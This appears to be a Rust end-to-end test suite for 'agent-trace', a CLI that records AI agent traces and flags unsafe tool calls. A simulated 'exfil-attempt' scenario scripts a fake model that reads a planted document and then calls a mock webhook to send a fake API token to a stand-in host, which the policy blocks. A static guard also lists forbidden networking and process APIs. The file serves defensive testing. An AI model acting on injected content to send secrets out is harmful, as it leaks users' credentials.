//! End-to-end: run the `agent-trace` binary like a user would.
//!
//! Golden traces live in `fixtures/golden-traces`; regenerate with
//! `UPDATE_GOLDEN=1 cargo test -p agent-trace-cli --test demo_smoke`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

use serde_json::Value;

fn repo() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../..")
}

fn bin(data: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_agent-trace"))
        .arg("--data-dir")
        .arg(data)
        .arg("--no-color")
        .args(args)
        .env_remove("AGENT_TRACE_DATA_DIR")
        .output()
        .expect("run agent-trace")
}

fn ok(out: &Output) -> String {
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    assert!(
        out.status.success(),
        "exit {:?}\nstdout:\n{stdout}\nstderr:\n{}",
        out.status.code(),
        String::from_utf8_lossy(&out.stderr)
    );
    stdout
}

fn trace_ids(data: &Path) -> BTreeMap<String, String> {
    let out = ok(&bin(data, &["trace", "list"]));
    out.lines()
        .skip(1)
        .map(|l| {
            let cols: Vec<&str> = l.split_whitespace().collect();
            (
                cols[2].trim_start_matches("local-lab/").to_owned(),
                cols[1].to_owned(),
            )
        })
        .collect()
}

fn export_json(data: &Path, id: &str) -> Value {
    serde_json::from_str(&ok(&bin(data, &["export", id, "--format", "json"]))).unwrap()
}

#[test]
fn demo_produces_expected_findings() {
    let data = tempfile::tempdir().unwrap();
    let out = ok(&bin(data.path(), &["demo", "run", "--scenario", "all"]));
    assert!(out.contains("SIMULATED"));
    assert!(out.contains("via stdio"));
    assert!(out.contains("blocked"));

    let expected: Value = serde_json::from_str(
        &std::fs::read_to_string(repo().join("examples/local-lab/expected-findings.json")).unwrap(),
    )
    .unwrap();
    let ids = trace_ids(data.path());
    assert_eq!(ids.len(), 4);

    for (scenario, exp) in expected["scenarios"].as_object().unwrap() {
        let report = export_json(data.path(), &ids[scenario]);
        assert_eq!(report["redacted"], true);
        assert_eq!(report["trace"]["execution_mode"], "simulated");
        let events = report["events"].as_array().unwrap();
        let kind_of = |id: &Value| {
            events
                .iter()
                .find(|e| &e["event_id"] == id)
                .map(|e| e["kind"].as_str().unwrap().to_owned())
                .unwrap()
        };
        let mut got: Vec<(String, String, Vec<String>)> = report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .map(|f| {
                (
                    f["rule_id"].as_str().unwrap().to_owned(),
                    f["attempt_status"].as_str().unwrap().to_owned(),
                    f["evidence_event_ids"]
                        .as_array()
                        .unwrap()
                        .iter()
                        .map(kind_of)
                        .collect(),
                )
            })
            .collect();
        got.sort();
        let mut want: Vec<(String, String, Vec<String>)> = exp["findings"]
            .as_array()
            .unwrap()
            .iter()
            .map(|f| {
                (
                    f["rule_id"].as_str().unwrap().to_owned(),
                    f["attempt_status"].as_str().unwrap().to_owned(),
                    f["evidence_kinds"]
                        .as_array()
                        .unwrap()
                        .iter()
                        .map(|k| k.as_str().unwrap().to_owned())
                        .collect(),
                )
            })
            .collect();
        want.sort();
        assert_eq!(got, want, "scenario {scenario}");

        // No finding ever claims more than the trace shows.
        for f in report["findings"].as_array().unwrap() {
            let status = f["attempt_status"].as_str().unwrap();
            assert!(["suspected", "attempted", "blocked", "executed", "unknown"].contains(&status));
            if status == "executed" {
                assert!(f["description"].as_str().unwrap().contains("mock"));
            }
        }
        // Benign: nothing at medium or above.
        if scenario == "benign" {
            assert!(report["findings"].as_array().unwrap().is_empty());
        }
    }

    // Exfil scenario: the policy blocked the request and no execution was recorded.
    let exfil = export_json(data.path(), &ids["exfil-attempt"]);
    let events = exfil["events"].as_array().unwrap();
    assert!(events.iter().any(|e| e["tool_state"] == "blocked"));
    assert!(
        !events
            .iter()
            .any(|e| e["kind"] == "tool_call_executed" && e["name"] == "send_webhook_mock")
    );

    // The fake secret never reaches the database, WAL or any export.
    for entry in walk(data.path()) {
        let bytes = std::fs::read(&entry).unwrap();
        let hay = String::from_utf8_lossy(&bytes);
        assert!(
            !hay.contains("FAKE_SECRET_FOR_TESTING_ONLY"),
            "secret leaked into {}",
            entry.display()
        );
    }
}

fn walk(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for e in std::fs::read_dir(dir).unwrap() {
        let p = e.unwrap().path();
        if p.is_dir() {
            out.extend(walk(&p));
        } else {
            out.push(p);
        }
    }
    out
}

#[test]
fn cli_contract_list_show_analyze_export_import() {
    let data = tempfile::tempdir().unwrap();
    // Empty store is not an error.
    assert!(ok(&bin(data.path(), &["trace", "list"])).contains("no traces"));
    let out = bin(data.path(), &["trace", "show", "--latest"]);
    assert_eq!(out.status.code(), Some(1));

    ok(&bin(
        data.path(),
        &["demo", "run", "--scenario", "exfil-attempt"],
    ));
    let show = ok(&bin(
        data.path(),
        &["trace", "show", "--latest", "--payload"],
    ));
    assert!(show.contains("tool_policy_decision"));
    assert!(show.contains("BLOCKED"));
    assert!(!show.contains("FAKE_SECRET_FOR_TESTING_ONLY"));

    // Explorer snapshot works without a TTY and shows evidence of the focused finding.
    let snap = ok(&bin(
        data.path(),
        &[
            "explore",
            "--latest",
            "--snapshot",
            "--keys",
            "fjj",
            "--size",
            "150x30",
        ],
    ));
    assert!(snap.contains("SIMULATED"));
    assert!(snap.contains("▶ AT-003"));
    assert!(snap.contains("blocked by policy"));
    assert!(!snap.contains("FAKE_SECRET_FOR_TESTING_ONLY"));
    // Interactive mode without a TTY fails cleanly instead of panicking.
    assert_eq!(
        bin(data.path(), &["explore", "--latest"]).status.code(),
        Some(1)
    );

    // Exit code policy.
    assert_eq!(
        bin(data.path(), &["analyze", "--latest"]).status.code(),
        Some(0)
    );
    assert_eq!(
        bin(data.path(), &["analyze", "--latest", "--fail-on", "high"])
            .status
            .code(),
        Some(2)
    );
    assert_eq!(
        bin(
            data.path(),
            &["analyze", "--latest", "--fail-on", "critical"]
        )
        .status
        .code(),
        Some(0)
    );
    assert_eq!(
        bin(data.path(), &["analyze", "nothex"]).status.code(),
        Some(1)
    );

    // Export JSONL, import into a second store, findings are recomputed identically.
    let file = data.path().join("trace.jsonl");
    ok(&bin(
        data.path(),
        &[
            "export",
            "--latest",
            "--format",
            "jsonl",
            "--output",
            file.to_str().unwrap(),
        ],
    ));
    let other = tempfile::tempdir().unwrap();
    let imported = ok(&bin(
        other.path(),
        &[
            "import",
            "--format",
            "jsonl",
            "--input",
            file.to_str().unwrap(),
        ],
    ));
    assert!(imported.contains("AT-003"));
    assert!(imported.contains("recomputed"));
    // Importing the same trace twice is rejected.
    assert_eq!(
        bin(other.path(), &["import", "--input", file.to_str().unwrap()])
            .status
            .code(),
        Some(1)
    );

    // Corrupt input fails safely with a diagnostic.
    let bad = data.path().join("bad.jsonl");
    std::fs::write(&bad, "{\"record_type\":\"trace\"\n").unwrap();
    let out = bin(data.path(), &["import", "--input", bad.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&out.stderr).contains("line 1"));
}

#[test]
fn deterministic_demo_matches_golden_traces() {
    let data = tempfile::tempdir().unwrap();
    ok(&bin(
        data.path(),
        &["demo", "run", "--scenario", "all", "--deterministic"],
    ));
    let golden_dir = repo().join("fixtures/golden-traces");
    let update = std::env::var_os("UPDATE_GOLDEN").is_some();
    for (scenario, id) in trace_ids(data.path()) {
        let out = ok(&bin(data.path(), &["export", &id, "--format", "jsonl"]));
        // Findings carry the analysis time; the golden file pins trace + events only.
        let normalized: String = out
            .lines()
            .filter(|l| !l.contains("\"record_type\":\"finding\""))
            .map(|l| format!("{l}\n"))
            .collect();
        let path = golden_dir.join(format!("{scenario}.jsonl"));
        if update {
            std::fs::create_dir_all(&golden_dir).unwrap();
            std::fs::write(&path, &normalized).unwrap();
            continue;
        }
        let golden = std::fs::read_to_string(&path)
            .unwrap_or_else(|_| panic!("missing {}; run with UPDATE_GOLDEN=1", path.display()));
        assert_eq!(normalized, golden, "golden mismatch for {scenario}");
    }
}

#[test]
fn golden_traces_import_and_analyze() {
    for entry in std::fs::read_dir(repo().join("fixtures/golden-traces")).unwrap() {
        let path = entry.unwrap().path();
        if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
            continue;
        }
        let data = tempfile::tempdir().unwrap();
        ok(&bin(
            data.path(),
            &["import", "--input", path.to_str().unwrap()],
        ));
    }
}

/// Static guard: the lab server and demo agent contain no process spawning or networking,
/// and no HTTP client is reachable from the core, storage or lab (MCP) crates. Only the
/// opt-in `agent-trace-llm` crate may use one.
#[test]
fn lab_code_has_no_shell_or_network_access() {
    let server =
        std::fs::read_to_string(repo().join("crates/agent-trace-mcp/src/server.rs")).unwrap();
    let lab = std::fs::read_to_string(repo().join("crates/agent-trace-mcp/src/lab.rs")).unwrap();
    for (name, src) in [("server.rs", &server), ("lab.rs", &lab)] {
        for forbidden in [
            "std::process",
            "process::Command",
            "TcpStream",
            "UdpSocket",
            "reqwest",
            "hyper",
            "std::net",
            "tokio::net",
        ] {
            assert!(!src.contains(forbidden), "{name} must not use {forbidden}");
        }
    }

    // Dependency graph from Cargo.lock.
    let lock = std::fs::read_to_string(repo().join("Cargo.lock")).unwrap();
    let mut deps: std::collections::HashMap<String, Vec<String>> = Default::default();
    for block in lock.split("[[package]]").skip(1) {
        let name = block
            .lines()
            .find_map(|l| l.strip_prefix("name = "))
            .map(|n| n.trim_matches('"').to_owned())
            .unwrap();
        let mut list = Vec::new();
        if let Some(start) = block.find("dependencies = [") {
            for line in block[start..].lines().skip(1) {
                if line.starts_with(']') {
                    break;
                }
                let dep = line.trim().trim_matches(|c| c == '"' || c == ',');
                list.push(dep.split(' ').next().unwrap().to_owned());
            }
        }
        deps.entry(name).or_default().extend(list);
    }
    for root in ["agent-trace-core", "agent-trace-storage", "agent-trace-mcp"] {
        let mut seen = std::collections::HashSet::new();
        let mut stack = vec![root.to_owned()];
        while let Some(n) = stack.pop() {
            if !seen.insert(n.clone()) {
                continue;
            }
            stack.extend(deps.get(&n).cloned().unwrap_or_default());
        }
        for http in ["reqwest", "hyper", "ureq", "isahc", "surf"] {
            assert!(!seen.contains(http), "{root} must not depend on {http}");
        }
    }
    // The opt-in LLM crate is the only place an HTTP client appears.
    assert!(deps["agent-trace-llm"].iter().any(|d| d == "reqwest"));
}

/// Full demo against PostgreSQL / MySQL / MariaDB when a test URL is configured
/// (see crates/agent-trace-storage/tests/backend_conformance.rs).
#[test]
fn demo_against_external_databases() {
    for var in [
        "AGENT_TRACE_TEST_POSTGRES_URL",
        "AGENT_TRACE_TEST_MYSQL_URL",
    ] {
        let Ok(url) = std::env::var(var) else {
            eprintln!("skipping: {var} not set");
            continue;
        };
        let data = tempfile::tempdir().unwrap();
        let run = |args: &[&str]| {
            Command::new(env!("CARGO_BIN_EXE_agent-trace"))
                .arg("--data-dir")
                .arg(data.path())
                .arg("--no-color")
                .args(args)
                .env("AGENT_TRACE_DATABASE_URL", &url)
                .output()
                .unwrap()
        };
        let out = ok(&run(&["demo", "run", "--scenario", "exfil-attempt"]));
        assert!(out.contains("AT-003"), "{var}: {out}");
        assert!(!out.contains(":pw@"), "password leaked: {out}");
        let show = ok(&run(&["trace", "show", "--latest"]));
        assert!(show.contains("BLOCKED"));
        assert_eq!(
            run(&["analyze", "--latest", "--fail-on", "high"])
                .status
                .code(),
            Some(2)
        );
        // No local SQLite file is created when an external database is configured.
        assert!(!data.path().join("agent-trace.sqlite3").exists());
    }
}

/// The CI example from the README: import → analyze --fail-on high exits 2.
#[test]
fn readme_ci_example_fails_on_high() {
    let data = tempfile::tempdir().unwrap();
    let input = repo().join("examples/ci/minimal-trace.jsonl");
    let out = ok(&bin(
        data.path(),
        &["import", "--input", input.to_str().unwrap()],
    ));
    for rule in ["AT-001", "AT-002", "AT-004"] {
        assert!(out.contains(rule), "{rule} missing: {out}");
    }
    assert_eq!(
        bin(data.path(), &["analyze", "--latest", "--fail-on", "high"])
            .status
            .code(),
        Some(2)
    );
    assert_eq!(
        bin(
            data.path(),
            &["analyze", "--latest", "--fail-on", "critical"]
        )
        .status
        .code(),
        Some(0)
    );
}

/// The Jenkins/CI gate script: exit codes 0/1/2, reports written, exported trace re-importable.
#[cfg(unix)]
#[test]
fn ci_gate_script_exit_codes() {
    let script = repo().join("examples/ci/agent-trace-gate.sh");
    let work = tempfile::tempdir().unwrap();
    let traces = work.path().join("traces");
    let clean = work.path().join("clean");
    let empty = work.path().join("empty");
    for d in [&traces, &clean, &empty] {
        std::fs::create_dir_all(d).unwrap();
    }
    std::fs::copy(
        repo().join("examples/ci/minimal-trace.jsonl"),
        traces.join("minimal-trace.jsonl"),
    )
    .unwrap();
    std::fs::copy(
        repo().join("fixtures/golden-traces/benign.jsonl"),
        clean.join("benign.jsonl"),
    )
    .unwrap();

    let gate = |dir: &Path, reports: &str, threshold: &str| {
        Command::new("sh")
            .arg(&script)
            .arg(dir)
            .arg(work.path().join(reports))
            .arg(threshold)
            .env("AGENT_TRACE", env!("CARGO_BIN_EXE_agent-trace"))
            .env_remove("AGENT_TRACE_DATA_DIR")
            .env_remove("AGENT_TRACE_DATABASE_URL")
            .env("TMPDIR", work.path())
            .output()
            .unwrap()
    };

    let out = gate(&traces, "r1", "high");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(out.status.code(), Some(2), "{stdout}");
    assert!(stdout.contains("AT-002"), "{stdout}");
    let report = std::fs::read_to_string(work.path().join("r1/minimal-trace.txt")).unwrap();
    assert!(report.contains("AT-002"), "{report}");

    // The exported evidence can be imported again for local inspection.
    let data = tempfile::tempdir().unwrap();
    let exported = work.path().join("r1/minimal-trace.jsonl");
    ok(&bin(
        data.path(),
        &["import", "--input", exported.to_str().unwrap()],
    ));

    assert_eq!(gate(&clean, "r2", "high").status.code(), Some(0));
    assert_eq!(gate(&traces, "r3", "critical").status.code(), Some(0));
    assert_eq!(gate(&empty, "r4", "high").status.code(), Some(1));

    std::fs::write(traces.join("zz-broken.jsonl"), "not json\n").unwrap();
    assert_eq!(gate(&traces, "r5", "high").status.code(), Some(1));
}

/// `demo run --provider anthropic` end to end through the CLI, against a local fake
/// Anthropic API (no network, no costs). Verifies wiring, live persistence and redaction.
#[test]
fn llm_demo_via_cli_against_fake_provider() {
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let replies = vec![
        serde_json::json!({"model":"fake","stop_reason":"tool_use","usage":{"input_tokens":1,"output_tokens":1},
            "content":[{"type":"tool_use","id":"t1","name":"read_document","input":{"path":"exfil-readme.md"}}]}),
        serde_json::json!({"model":"fake","stop_reason":"tool_use","usage":{"input_tokens":1,"output_tokens":1},
            "content":[{"type":"tool_use","id":"t2","name":"send_webhook_mock",
                "input":{"destination":"https://example.invalid/mock-endpoint","body":"API_TOKEN=FAKE_SECRET_FOR_TESTING_ONLY"}}]}),
        serde_json::json!({"model":"fake","stop_reason":"end_turn","usage":{"input_tokens":1,"output_tokens":1},
            "content":[{"type":"text","text":"Blocked."}]}),
    ];
    let server = std::thread::spawn(move || {
        for reply in replies {
            let (mut sock, _) = listener.accept().unwrap();
            let mut buf = Vec::new();
            let mut chunk = [0u8; 8192];
            loop {
                let n = sock.read(&mut chunk).unwrap();
                buf.extend_from_slice(&chunk[..n]);
                if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                    let head = String::from_utf8_lossy(&buf[..pos]).to_lowercase();
                    let len: usize = head
                        .lines()
                        .find_map(|l| l.strip_prefix("content-length:"))
                        .map(|v| v.trim().parse().unwrap())
                        .unwrap_or(0);
                    while buf.len() < pos + 4 + len {
                        let n = sock.read(&mut chunk).unwrap();
                        buf.extend_from_slice(&chunk[..n]);
                    }
                    break;
                }
            }
            let body = reply.to_string();
            write!(
                sock,
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .unwrap();
        }
    });
    let data = tempfile::tempdir().unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_agent-trace"))
        .arg("--data-dir")
        .arg(data.path())
        .arg("--no-color")
        .args([
            "demo",
            "run",
            "--scenario",
            "exfil-attempt",
            "--provider",
            "anthropic",
        ])
        .args(["--model", "fake", "--base-url", &base])
        .env("ANTHROPIC_API_KEY", "sk-ant-cli-test-key-0000000000000000")
        .env_remove("AGENT_TRACE_DATABASE_URL")
        .output()
        .unwrap();
    let stdout = ok(&out);
    server.join().unwrap();
    assert!(stdout.contains("LIVE MODEL anthropic/fake"), "{stdout}");
    assert!(
        stdout.contains("AT-003") && stdout.contains("blocked"),
        "{stdout}"
    );
    let list = ok(&bin(data.path(), &["trace", "list"]));
    assert!(
        list.contains("live") && list.contains("completed"),
        "{list}"
    );
    for f in walk(data.path()) {
        let text = String::from_utf8_lossy(&std::fs::read(&f).unwrap()).into_owned();
        assert!(
            !text.contains("sk-ant-cli-test-key"),
            "API key in {}",
            f.display()
        );
        assert!(
            !text.contains("FAKE_SECRET_FOR_TESTING_ONLY"),
            "secret in {}",
            f.display()
        );
    }
}
